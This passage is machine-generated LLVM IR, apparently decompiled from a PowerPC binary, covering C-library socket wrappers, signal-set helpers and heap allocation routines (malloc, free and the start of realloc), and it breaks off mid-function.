define i32 @__GI_getsockname(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg3, i32* @r5, align 4
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1000aabc = ptrtoint i32* %stack_var_-24 to i32
  store i32 268479180, i32* @lr, align 4
  %v2_1000aac8 = call i32 @__socketcall(i32 6, i32 %v2_1000aabc)
  ret i32 %v2_1000aac8

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @getsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-40, align 4
  %v2_1000aaf0 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268479240, i32* @lr, align 4
  %v2_1000ab04 = call i32 @__socketcall(i32 15, i32 %v2_1000aaf0)
  ret i32 %v2_1000ab04

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1000ab2c = ptrtoint i32* %stack_var_-24 to i32
  store i32 268479296, i32* @lr, align 4
  %v2_1000ab3c = call i32 @__socketcall(i32 10, i32 %v2_1000ab2c)
  ret i32 %v2_1000ab3c

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1000ab64 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268479352, i32* @lr, align 4
  %v2_1000ab74 = call i32 @__socketcall(i32 9, i32 %v2_1000ab64)
  ret i32 %v2_1000ab74

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-40, align 4
  %v2_1000ab9c = ptrtoint i32* %stack_var_-40 to i32
  store i32 268479416, i32* @lr, align 4
  %v2_1000abb4 = call i32 @__socketcall(i32 11, i32 %v2_1000ab9c)
  ret i32 %v2_1000abb4

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-40, align 4
  %v2_1000abdc = ptrtoint i32* %stack_var_-40 to i32
  store i32 268479476, i32* @lr, align 4
  %v2_1000abf0 = call i32 @__socketcall(i32 14, i32 %v2_1000abdc)
  ret i32 %v2_1000abf0

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1000ac18 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268479528, i32* @lr, align 4
  %v2_1000ac24 = call i32 @__socketcall(i32 1, i32 %v2_1000ac18)
  ret i32 %v2_1000ac24

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32 (i32, i32)* @__socketcall, { 2, 1, 6, 0, 3, 5, 7, 4 }
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r4, align 4
  %arg1.off = add i32 %arg1, -1
  %tmp4 = icmp ult i32 %arg1.off, 64
  br i1 %tmp4, label %dec_label_pc_1000ac68, label %dec_label_pc_1000ac54

dec_label_pc_1000ac54:                            ; preds = %entry
  %v0_1000ac54 = call i32 @__errno_location()
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_1000ac60 = inttoptr i32 %v0_1000ac54 to i32*
  store i32 22, i32* %v2_1000ac60, align 4
  %v0_1000ac74.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000ac70

dec_label_pc_1000ac68:                            ; preds = %entry
  %v0_1000ac68 = call i32 @__sigaddset()
  store i32 %v0_1000ac68, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000ac70

dec_label_pc_1000ac70:                            ; preds = %dec_label_pc_1000ac54, %dec_label_pc_1000ac68
  %v0_1000ac74 = phi i32 [ %v0_1000ac74.pre, %dec_label_pc_1000ac54 ], [ %v0_1000ac68, %dec_label_pc_1000ac68 ]
  ret i32 %v0_1000ac74

; uselistorder directives
  uselistorder label %dec_label_pc_1000ac70, { 1, 0 }
}

define i32 @sigemptyset(i32 %arg1) local_unnamed_addr {
entry:
  store i32 268479644, i32* @lr, align 4
  %v3_1000ac98 = call i32 @__GI_memset(i32 0, i32 128, i32 128)
  ret i32 0
}

define i32 @__bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %stack_var_-296 = alloca i32, align 4
  %v3_1000acb0 = icmp eq i32 %arg2, -1
  store i32 %arg1, i32* %r31.global-to-local, align 4
  br i1 %v3_1000acb0, label %dec_label_pc_1000acdc, label %dec_label_pc_1000accc

dec_label_pc_1000accc:                            ; preds = %entry
  %tmp20 = icmp slt i32 %arg1, 1
  br i1 %tmp20, label %dec_label_pc_1000acdc, label %dec_label_pc_1000acd4

dec_label_pc_1000acd4:                            ; preds = %dec_label_pc_1000accc
  %tmp21 = icmp slt i32 %arg1, 65
  br i1 %tmp21, label %dec_label_pc_1000ad0c.lr.ph, label %dec_label_pc_1000acdc

dec_label_pc_1000acdc:                            ; preds = %dec_label_pc_1000acd4, %dec_label_pc_1000accc, %entry
  %v0_1000acdc = call i32 @__errno_location()
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_1000ace8 = inttoptr i32 %v0_1000acdc to i32*
  store i32 22, i32* %v2_1000ace8, align 4
  %v0_1000ad7c.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000ad78

dec_label_pc_1000ad0c.lr.ph:                      ; preds = %dec_label_pc_1000acd4
  %v2_1000acfc = ptrtoint i32* %stack_var_-296 to i32
  store i32 %v2_1000acfc, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-296, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  %v2_1000ad0c22 = add i32 %v2_1000acfc, 128
  %v3_1000ad0c23 = inttoptr i32 %v2_1000ad0c22 to i32*
  store i32 0, i32* %v3_1000ad0c23, align 4
  %v0_1000ad1024 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000ad1025 = add i32 %v0_1000ad1024, -1
  store i32 %v1_1000ad1025, i32* %r11.global-to-local, align 4
  %v1_1000ad1426 = mul i32 %v1_1000ad1025, 4
  %v1_1000ad1827 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000ad1828 = add i32 %v1_1000ad1827, %v1_1000ad1426
  store i32 %v2_1000ad1828, i32* %r9.global-to-local, align 4
  %v0_1000ad1c29 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000ad1c30 = add i32 %v0_1000ad1c29, -1
  store i32 %v1_1000ad1c30, i32* %ctr.global-to-local, align 4
  %v2_1000ad1c31 = icmp eq i32 %v1_1000ad1c30, 0
  br i1 %v2_1000ad1c31, label %dec_label_pc_1000ad20, label %dec_label_pc_1000ad0c.dec_label_pc_1000ad0c_crit_edge

dec_label_pc_1000ad0c.dec_label_pc_1000ad0c_crit_edge: ; preds = %dec_label_pc_1000ad0c.lr.ph, %dec_label_pc_1000ad0c.dec_label_pc_1000ad0c_crit_edge
  %v2_1000ad1832 = phi i32 [ %v2_1000ad18, %dec_label_pc_1000ad0c.dec_label_pc_1000ad0c_crit_edge ], [ %v2_1000ad1828, %dec_label_pc_1000ad0c.lr.ph ]
  %v0_1000ad0c.pre = load i32, i32* %r10.global-to-local, align 4
  %v2_1000ad0c = add i32 %v2_1000ad1832, 4
  %v3_1000ad0c = inttoptr i32 %v2_1000ad0c to i32*
  store i32 %v0_1000ad0c.pre, i32* %v3_1000ad0c, align 4
  %v0_1000ad10 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000ad10 = add i32 %v0_1000ad10, -1
  store i32 %v1_1000ad10, i32* %r11.global-to-local, align 4
  %v1_1000ad14 = mul i32 %v1_1000ad10, 4
  %v1_1000ad18 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000ad18 = add i32 %v1_1000ad18, %v1_1000ad14
  store i32 %v2_1000ad18, i32* %r9.global-to-local, align 4
  %v0_1000ad1c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000ad1c = add i32 %v0_1000ad1c, -1
  store i32 %v1_1000ad1c, i32* %ctr.global-to-local, align 4
  %v2_1000ad1c = icmp eq i32 %v1_1000ad1c, 0
  br i1 %v2_1000ad1c, label %dec_label_pc_1000ad20, label %dec_label_pc_1000ad0c.dec_label_pc_1000ad0c_crit_edge

dec_label_pc_1000ad20:                            ; preds = %dec_label_pc_1000ad0c.dec_label_pc_1000ad0c_crit_edge, %dec_label_pc_1000ad0c.lr.ph
  %v0_1000ad24.pre = load i32, i32* %r31.global-to-local, align 4
  %v2_1000ad20 = ptrtoint i32* %stack_var_-292 to i32
  store i32 %v2_1000ad20, i32* @r3, align 4
  store i32 %v0_1000ad24.pre, i32* @r4, align 4
  %v0_1000ad28 = call i32 @__sigaddset()
  %v1_1000ad2c = icmp slt i32 %v0_1000ad28, 0
  br i1 %v1_1000ad2c, label %dec_label_pc_1000ad74, label %dec_label_pc_1000ad34

dec_label_pc_1000ad34:                            ; preds = %dec_label_pc_1000ad20
  %v0_1000ad38 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000ad40 = call i32 @__sigismember(i32 ptrtoint (i32* @global_var_100297d0.329 to i32), i32 %v0_1000ad38)
  %v2_1000ad4c = ptrtoint i32* %stack_var_-156 to i32
  store i32 268479844, i32* @lr, align 4
  %v4_1000ad60 = call i32 @__libc_sigaction(i32 %v0_1000ad38, i32* nonnull %stack_var_-296, i32 %v2_1000ad4c)
  %v1_1000ad64 = icmp slt i32 %v4_1000ad60, 0
  br i1 %v1_1000ad64, label %dec_label_pc_1000ad74, label %dec_label_pc_1000ad6c

dec_label_pc_1000ad6c:                            ; preds = %dec_label_pc_1000ad34
  %v3_1000ad6c = load i32, i32* %stack_var_-156, align 4
  store i32 %v3_1000ad6c, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000ad78

dec_label_pc_1000ad74:                            ; preds = %dec_label_pc_1000ad34, %dec_label_pc_1000ad20
  store i32 -1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000ad78

dec_label_pc_1000ad78:                            ; preds = %dec_label_pc_1000ad6c, %dec_label_pc_1000acdc, %dec_label_pc_1000ad74
  %v0_1000ad7c = phi i32 [ %v3_1000ad6c, %dec_label_pc_1000ad6c ], [ %v0_1000ad7c.pre, %dec_label_pc_1000acdc ], [ -1, %dec_label_pc_1000ad74 ]
  ret i32 %v0_1000ad7c

; uselistorder directives
  uselistorder i32 %v1_1000ad1c, { 1, 0 }
  uselistorder i32 %v2_1000ad18, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r31.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r11.global-to-local, { 2, 1, 0, 3, 4 }
  uselistorder i32* %ctr.global-to-local, { 2, 1, 0, 3, 4 }
  uselistorder i32 65, { 2, 3, 0, 1 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000ad78, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000ad0c.dec_label_pc_1000ad0c_crit_edge, { 1, 0 }
}

define i32 @__sigismember(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_1000ad90 = add i32 %arg2, -1
  %v1_1000ad94 = call i32 @__asm_rlwinm(i32 %v1_1000ad90, i32 29, i32 3, i32 29)
  %v1_1000ad98 = urem i32 %v1_1000ad90, 32
  %v2_1000ad9c = add i32 %v1_1000ad94, %arg1
  %v3_1000ad9c = inttoptr i32 %v2_1000ad9c to i32*
  %v4_1000ad9c = load i32, i32* %v3_1000ad9c, align 4
  %v3_1000ada4 = shl i32 1, %v1_1000ad98
  %v2_1000ada8 = and i32 %v4_1000ad9c, %v3_1000ada4
  %v2_1000adac = icmp ne i32 %v2_1000ada8, 0
  %v5_1000adb0 = zext i1 %v2_1000adac to i32
  ret i32 %v5_1000adb0
}

define i32 @__sigaddset() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %v0_1000adb8 = load i32, i32* @r4, align 4
  %v1_1000adb8 = add i32 %v0_1000adb8, -1
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_1000adc0 = call i32 @__asm_rlwinm(i32 %v1_1000adb8, i32 29, i32 3, i32 29)
  %v1_1000adc4 = urem i32 %v1_1000adb8, 32
  %v1_1000adc8 = load i32, i32* @r3, align 4
  %v2_1000adc8 = add i32 %v1_1000adc8, %v1_1000adc0
  %v3_1000adc8 = inttoptr i32 %v2_1000adc8 to i32*
  %v4_1000adc8 = load i32, i32* %v3_1000adc8, align 4
  %v0_1000adcc = load i32, i32* %r0.global-to-local, align 4
  %v3_1000adcc = shl i32 %v0_1000adcc, %v1_1000adc4
  store i32 %v3_1000adcc, i32* %r0.global-to-local, align 4
  %v2_1000add0 = or i32 %v3_1000adcc, %v4_1000adc8
  store i32 %v2_1000add0, i32* %v3_1000adc8, align 4
  ret i32 0
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_1000ade0 = add i32 %arg2, -1
  %v1_1000ade8 = call i32 @__asm_rlwinm(i32 %v1_1000ade0, i32 29, i32 3, i32 29)
  %v1_1000adec = urem i32 %v1_1000ade0, 32
  %v2_1000adf0 = add i32 %v1_1000ade8, %arg1
  %v3_1000adf0 = inttoptr i32 %v2_1000adf0 to i32*
  %v4_1000adf0 = load i32, i32* %v3_1000adf0, align 4
  %v3_1000adf4 = shl i32 -2, %v1_1000adec
  %v4_1000adf4 = sub nsw i32 32, %v1_1000adec
  %v5_1000adf4 = lshr i32 -2, %v4_1000adf4
  %v6_1000adf4 = or i32 %v5_1000adf4, %v3_1000adf4
  %v2_1000adf8 = and i32 %v6_1000adf4, %v4_1000adf0
  store i32 %v2_1000adf8, i32* %v3_1000adf0, align 4
  ret i32 0
}

define i32 @malloc() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_1000ae08 = load i32, i32* @r3, align 4
  %v3_1000ae08 = icmp eq i32 %v0_1000ae08, 0
  br i1 %v3_1000ae08, label %dec_label_pc_1000ae20, label %dec_label_pc_1000ae24

dec_label_pc_1000ae20:                            ; preds = %entry
  br label %dec_label_pc_1000ae24

dec_label_pc_1000ae24:                            ; preds = %entry, %dec_label_pc_1000ae20
  %v0_1000ae34 = phi i32 [ 1, %dec_label_pc_1000ae20 ], [ %v0_1000ae08, %entry ]
  %v3_1000ae28 = icmp ugt i32 %v0_1000ae34, -8
  br i1 %v3_1000ae28, label %dec_label_pc_1000af38, label %dec_label_pc_1000ae30

dec_label_pc_1000ae30:                            ; preds = %dec_label_pc_1000ae24
  %v1_1000ae34 = add i32 %v0_1000ae34, 4
  store i32 ptrtoint (i32* @global_var_100297a0.330 to i32), i32* @r29, align 4
  store i32 %v1_1000ae34, i32* %stack_var_-40, align 4
  %v0_1000ae44 = call i32 @__pthread_return_0()
  %v2_1000ae4c = ptrtoint i32* %stack_var_-40 to i32
  %v3_1000ae54 = call i32 @__heap_alloc(i32* inttoptr (i32 268580096 to i32*), i32 %v2_1000ae4c)
  store i32 %v3_1000ae54, i32* %r31.global-to-local, align 4
  %v0_1000ae60 = call i32 @__pthread_return_0()
  %v3_1000ae64 = icmp eq i32 %v3_1000ae54, 0
  br i1 %v3_1000ae64, label %dec_label_pc_1000ae6c, label %dec_label_pc_1000af1c.thread

dec_label_pc_1000af1c.thread:                     ; preds = %dec_label_pc_1000ae30
  br label %dec_label_pc_1000af30

dec_label_pc_1000ae6c:                            ; preds = %dec_label_pc_1000ae30
  %v3_1000ae70 = load i32, i32* @global_var_10023560.271, align 4
  store i32 %v3_1000ae70, i32* %r31.global-to-local, align 4
  %v3_1000ae74 = load i32, i32* %stack_var_-40, align 4
  %v2_1000ae78 = icmp ult i32 %v3_1000ae74, %v3_1000ae70
  br i1 %v2_1000ae78, label %dec_label_pc_1000ae90, label %dec_label_pc_1000ae80

dec_label_pc_1000ae80:                            ; preds = %dec_label_pc_1000ae6c
  %v1_1000ae84 = sub i32 0, %v3_1000ae70
  %v2_1000ae80 = add i32 %v3_1000ae70, -1
  %v1_1000ae88 = add i32 %v2_1000ae80, %v3_1000ae74
  %v2_1000ae8c = and i32 %v1_1000ae88, %v1_1000ae84
  store i32 %v2_1000ae8c, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000ae90

dec_label_pc_1000ae90:                            ; preds = %dec_label_pc_1000ae6c, %dec_label_pc_1000ae80
  %v0_1000ae9c = call i32 @__pthread_return_0()
  %v0_1000aea0 = load i32, i32* %r31.global-to-local, align 4
  store i32 268480168, i32* @lr, align 4
  %v1_1000aea4 = call i32 @__GI_sbrk(i32 %v0_1000aea0)
  %v3_1000aea8 = icmp eq i32 %v1_1000aea4, -1
  br i1 %v3_1000aea8, label %dec_label_pc_1000aec8, label %dec_label_pc_1000aeb0

dec_label_pc_1000aeb0:                            ; preds = %dec_label_pc_1000ae90
  %v1_1000aeb0 = add i32 %v1_1000aea4, 3
  %v1_1000aeb4 = call i32 @__asm_rlwinm(i32 %v1_1000aeb0, i32 0, i32 0, i32 29)
  store i32 %v1_1000aeb4, i32* @r30, align 4
  %v4_1000aeb8 = icmp eq i32 %v1_1000aeb4, %v1_1000aea4
  br i1 %v4_1000aeb8, label %dec_label_pc_1000aec8, label %dec_label_pc_1000aec0

dec_label_pc_1000aec0:                            ; preds = %dec_label_pc_1000aeb0
  %v2_1000aec0 = sub i32 %v1_1000aeb4, %v1_1000aea4
  store i32 268480200, i32* @lr, align 4
  %v1_1000aec4 = call i32 @__GI_sbrk(i32 %v2_1000aec0)
  br label %dec_label_pc_1000aec8

dec_label_pc_1000aec8:                            ; preds = %dec_label_pc_1000aeb0, %dec_label_pc_1000ae90, %dec_label_pc_1000aec0
  %v0_1000aed0 = call i32 @__pthread_return_0()
  %v0_1000aed4 = load i32, i32* @r30, align 4
  %v3_1000aed4 = icmp eq i32 %v0_1000aed4, -1
  br i1 %v3_1000aed4, label %dec_label_pc_1000af38, label %dec_label_pc_1000af1c

dec_label_pc_1000af1c:                            ; preds = %dec_label_pc_1000aec8
  store i32 ptrtoint (i32* @global_var_100297a0.330 to i32), i32* @r28, align 4
  store i32 ptrtoint (i32* @global_var_10023500 to i32), i32* @r29, align 4
  %v0_1000aef0 = call i32 @__pthread_return_0()
  %v0_1000aef4 = load i32, i32* @r31, align 4
  %v0_1000aef8 = load i32, i32* @r30, align 4
  %v0_1000aefc = load i32, i32* @r29, align 4
  store i32 268480260, i32* @lr, align 4
  %v3_1000af00 = inttoptr i32 %v0_1000aefc to i32*
  %v4_1000af00 = call i32 @__heap_free(i32* %v3_1000af00, i32 %v0_1000aef8, i32 %v0_1000aef4)
  %v0_1000af04 = load i32, i32* @r29, align 4
  %v2_1000af0c = inttoptr i32 %v0_1000af04 to i32*
  %v3_1000af0c = call i32 @__heap_alloc(i32* %v2_1000af0c, i32 %v2_1000ae4c)
  store i32 %v3_1000af0c, i32* %r31.global-to-local, align 4
  %v0_1000af18 = call i32 @__pthread_return_0()
  %v3_1000af1c = icmp eq i32 %v3_1000af0c, 0
  br i1 %v3_1000af1c, label %dec_label_pc_1000af30.thread, label %dec_label_pc_1000af30

dec_label_pc_1000af30.thread:                     ; preds = %dec_label_pc_1000af1c
  br label %dec_label_pc_1000af38

dec_label_pc_1000af30:                            ; preds = %dec_label_pc_1000af1c, %dec_label_pc_1000af1c.thread
  %v0_1000af30.pr6 = phi i32 [ %v3_1000ae54, %dec_label_pc_1000af1c.thread ], [ %v3_1000af0c, %dec_label_pc_1000af1c ]
  %v3_1000af24 = load i32, i32* %stack_var_-40, align 4
  %v2_1000af28 = inttoptr i32 %v0_1000af30.pr6 to i32*
  store i32 %v3_1000af24, i32* %v2_1000af28, align 4
  %v0_1000af2c = load i32, i32* %r31.global-to-local, align 4
  %v1_1000af2c = add i32 %v0_1000af2c, 4
  store i32 %v1_1000af2c, i32* @r31, align 4
  %v3_1000af30 = icmp eq i32 %v1_1000af2c, 0
  br i1 %v3_1000af30, label %dec_label_pc_1000af38, label %dec_label_pc_1000af48

dec_label_pc_1000af38:                            ; preds = %dec_label_pc_1000af30.thread, %dec_label_pc_1000af30, %dec_label_pc_1000aec8, %dec_label_pc_1000ae24
  %v0_1000af38 = call i32 @__errno_location()
  %v2_1000af40 = inttoptr i32 %v0_1000af38 to i32*
  store i32 12, i32* %v2_1000af40, align 4
  store i32 0, i32* @r31, align 4
  br label %dec_label_pc_1000af48

dec_label_pc_1000af48:                            ; preds = %dec_label_pc_1000af30, %dec_label_pc_1000af38
  %v0_1000af4c = phi i32 [ %v1_1000af2c, %dec_label_pc_1000af30 ], [ 0, %dec_label_pc_1000af38 ]
  ret i32 %v0_1000af4c

; uselistorder directives
  uselistorder i32 %v1_1000af2c, { 1, 0, 2 }
  uselistorder i32 %v1_1000aeb4, { 1, 0, 2 }
  uselistorder i32 %v1_1000aea4, { 1, 0, 2, 3 }
  uselistorder i32 %v3_1000ae70, { 1, 0, 2, 3 }
  uselistorder i32 %v3_1000ae54, { 1, 0, 2 }
  uselistorder i32* %stack_var_-40, { 0, 1, 3, 2 }
  uselistorder i32* %r31.global-to-local, { 4, 0, 2, 1, 3, 5 }
  uselistorder label %dec_label_pc_1000af48, { 1, 0 }
  uselistorder label %dec_label_pc_1000af38, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1000aec8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000ae90, { 1, 0 }
  uselistorder label %dec_label_pc_1000ae24, { 1, 0 }
}

define i32 @free() local_unnamed_addr {
entry:
  %v0_1000af60 = load i32, i32* @r3, align 4
  %v3_1000af60 = icmp eq i32 %v0_1000af60, 0
  br i1 %v3_1000af60, label %dec_label_pc_1000b04c, label %dec_label_pc_1000af78

dec_label_pc_1000af78:                            ; preds = %entry
  %v1_1000af7c = add i32 %v0_1000af60, -4
  %v2_1000af7c = inttoptr i32 %v1_1000af7c to i32*
  %v3_1000af7c = load i32, i32* %v2_1000af7c, align 4
  store i32 %v3_1000af7c, i32* @r28, align 4
  store i32 268566528, i32* @r26, align 4
  %v0_1000af90 = call i32 @__pthread_return_0()
  %v0_1000af98 = load i32, i32* @r28, align 4
  store i32 268480420, i32* @lr, align 4
  %v4_1000afa0 = call i32 @__heap_free(i32* nonnull @global_var_10023500, i32 %v1_1000af7c, i32 %v0_1000af98)
  %v3_1000afa8 = load i32, i32* @global_var_10023560.271, align 4
  store i32 %v4_1000afa0, i32* @r29, align 4
  %v1_1000afb0 = inttoptr i32 %v4_1000afa0 to i32*
  %v2_1000afb0 = load i32, i32* %v1_1000afb0, align 4
  store i32 %v2_1000afb0, i32* @r27, align 4
  %v1_1000afb4 = mul i32 %v3_1000afa8, 8
  %v2_1000afb8 = icmp ult i32 %v2_1000afb0, %v1_1000afb4
  br i1 %v2_1000afb8, label %dec_label_pc_1000afec, label %dec_label_pc_1000afc0

dec_label_pc_1000afc0:                            ; preds = %dec_label_pc_1000af78
  store i32 ptrtoint (i32* @global_var_10029850.333 to i32), i32* @r28, align 4
  %v0_1000afd0 = call i32 @__pthread_return_0()
  store i32 268480476, i32* @lr, align 4
  %v1_1000afd8 = call i32 @__GI_sbrk(i32 0)
  %v0_1000afdc = load i32, i32* @r31, align 4
  %v4_1000afdc = icmp eq i32 %v0_1000afdc, %v1_1000afd8
  br i1 %v4_1000afdc, label %dec_label_pc_1000aff4, label %dec_label_pc_1000afe4

dec_label_pc_1000afe4:                            ; preds = %dec_label_pc_1000afc0
  %v0_1000afe8 = call i32 @__pthread_return_0()
  br label %dec_label_pc_1000afec

dec_label_pc_1000afec:                            ; preds = %dec_label_pc_1000af78, %dec_label_pc_1000afe4
  br label %dec_label_pc_1000b048

dec_label_pc_1000aff4:                            ; preds = %dec_label_pc_1000afc0
  %v0_1000aff4 = load i32, i32* @r29, align 4
  %v1_1000aff4 = add i32 %v0_1000aff4, 4
  %v2_1000aff4 = inttoptr i32 %v1_1000aff4 to i32*
  %v3_1000aff4 = load i32, i32* %v2_1000aff4, align 4
  %v3_1000aff8 = icmp eq i32 %v3_1000aff4, 0
  br i1 %v3_1000aff8, label %dec_label_pc_1000b008, label %dec_label_pc_1000b000

dec_label_pc_1000b000:                            ; preds = %dec_label_pc_1000aff4
  %v1_1000b000 = add i32 %v0_1000aff4, 8
  %v2_1000b000 = inttoptr i32 %v1_1000b000 to i32*
  %v3_1000b000 = load i32, i32* %v2_1000b000, align 4
  %v2_1000b004 = add i32 %v3_1000aff4, 8
  %v3_1000b004 = inttoptr i32 %v2_1000b004 to i32*
  store i32 %v3_1000b000, i32* %v3_1000b004, align 4
  %v0_1000b008.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1000b008

dec_label_pc_1000b008:                            ; preds = %dec_label_pc_1000aff4, %dec_label_pc_1000b000
  %v0_1000b008 = phi i32 [ %v0_1000aff4, %dec_label_pc_1000aff4 ], [ %v0_1000b008.pre, %dec_label_pc_1000b000 ]
  %v1_1000b008 = add i32 %v0_1000b008, 8
  %v2_1000b008 = inttoptr i32 %v1_1000b008 to i32*
  %v3_1000b008 = load i32, i32* %v2_1000b008, align 4
  %v1_1000b00c = add i32 %v0_1000b008, 4
  %v2_1000b00c = inttoptr i32 %v1_1000b00c to i32*
  %v3_1000b00c = load i32, i32* %v2_1000b00c, align 4
  %v3_1000b010 = icmp eq i32 %v3_1000b008, 0
  br i1 %v3_1000b010, label %dec_label_pc_1000b020, label %dec_label_pc_1000b018

dec_label_pc_1000b018:                            ; preds = %dec_label_pc_1000b008
  %v2_1000b018 = add i32 %v3_1000b008, 4
  %v3_1000b018 = inttoptr i32 %v2_1000b018 to i32*
  store i32 %v3_1000b00c, i32* %v3_1000b018, align 4
  br label %dec_label_pc_1000b024

dec_label_pc_1000b020:                            ; preds = %dec_label_pc_1000b008
  store i32 %v3_1000b00c, i32* @global_var_10023500, align 4
  br label %dec_label_pc_1000b024

dec_label_pc_1000b024:                            ; preds = %dec_label_pc_1000b018, %dec_label_pc_1000b020
  %v0_1000b02c = call i32 @__pthread_return_0()
  %v0_1000b030 = load i32, i32* @r27, align 4
  %v1_1000b030 = load i32, i32* @r29, align 4
  %v0_1000b038 = load i32, i32* @r31, align 4
  %v2_1000b030 = sub i32 12, %v0_1000b030
  %v1_1000b034 = add i32 %v2_1000b030, %v1_1000b030
  %v2_1000b038 = sub i32 %v1_1000b034, %v0_1000b038
  store i32 268480576, i32* @lr, align 4
  %v1_1000b03c = call i32 @__GI_sbrk(i32 %v2_1000b038)
  br label %dec_label_pc_1000b048

dec_label_pc_1000b048:                            ; preds = %dec_label_pc_1000afec, %dec_label_pc_1000b024
  %v0_1000b048 = call i32 @__pthread_return_0()
  br label %dec_label_pc_1000b04c

dec_label_pc_1000b04c:                            ; preds = %entry, %dec_label_pc_1000b048
  %.0 = phi i32 [ undef, %entry ], [ %v0_1000b048, %dec_label_pc_1000b048 ]
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v0_1000b008, { 1, 0 }
  uselistorder i32 undef, { 0, 2, 1, 3 }
  uselistorder i32 (i32)* @__GI_sbrk, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1000b04c, { 1, 0 }
  uselistorder label %dec_label_pc_1000b048, { 1, 0 }
  uselistorder label %dec_label_pc_1000b024, { 1, 0 }
  uselistorder label %dec_label_pc_1000b008, { 1, 0 }
  uselistorder label %dec_label_pc_1000afec, { 1, 0 }
}

define i32 @realloc(i32 %arg1) local_unnamed_addr {
entry:
  %r27.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r3, align 4
  %v0_1000b060 = load i32, i32* @r4, align 4
  %v3_1000b060 = icmp eq i32 %v0_1000b060, 0
  store i32 %arg1, i32* @r28, align 4
  br i1 %v3_1000b060, label %dec_label_pc_1000b07c, label %dec_label_pc_1000b088

dec_label_pc_1000b07c:                            ; preds = %entry
  store i32 ptrtoint ([3 x i8]* @global_var_1000b080.336 to i32), i32* @lr, align 4
  %v0_1000b07c = call i32 @free()
  br label %dec_label_pc_1000b094

dec_label_pc_1000b088:                            ; preds = %entry
  %v3_1000b088 = icmp eq i32 %arg1, 0
